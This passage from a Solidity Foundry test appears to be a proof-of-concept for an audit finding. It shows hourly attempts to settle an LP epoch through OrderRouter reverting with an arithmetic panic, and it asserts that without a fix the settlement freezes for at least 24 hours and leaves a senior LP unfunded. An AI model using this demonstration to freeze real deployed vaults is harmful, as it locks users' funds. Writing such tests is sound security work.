        for (uint256 h; h < 30; ++h) {
            if (!_isLive(vm.getBlockTimestamp())) break;
            curPrice = _nextPathPrice();
            (bool ok, bytes memory ret) = _trySettleViaOrderRouterAt(curPrice);
            if (ok) {
                firstOk = vm.getBlockTimestamp();
                break;
            }
            assertEq(ret, PANIC_0x11, "OrderRouter.settleLpEpoch revert data: Panic(0x11)");
            assertEq(d.seniorVault.claimableRedeemRequest(sRid, sB), 0, "B unfunded at every failed attempt");
            ++fails;
            _warpTo(vm.getBlockTimestamp() + 1 hours);
        }
        console2.log("OFFSET BOOK: consecutive OrderRouter.settleLpEpoch attempts reverting with Panic(0x11)", fails);
        console2.log("OFFSET BOOK: first successful settlement timestamp (0 = none in the window)", firstOk);
        if (firstOk != 0) console2.log("OFFSET BOOK: hours from the trigger epoch to the first successful settlement", (firstOk - tTrigger) / 1 hours);
        console2.log("OFFSET BOOK: Junior principal after the first successful settlement", d.housePool.juniorPrincipal());
        console2.log("OFFSET BOOK: Senior LP B claimable redemption shares", d.seniorVault.claimableRedeemRequest(sRid, sB));
        if (expectFix) {
            assertEq(fails, 0, "fix: the trigger epoch settles");
            assertGt(d.seniorVault.claimableRedeemRequest(sRid, sB), 0, "fix: B is funded");
        } else {
            assertGe(fails, 24, "the offset open book does not prevent a freeze of at least 24 hourly attempts");
        }
    }

}
```
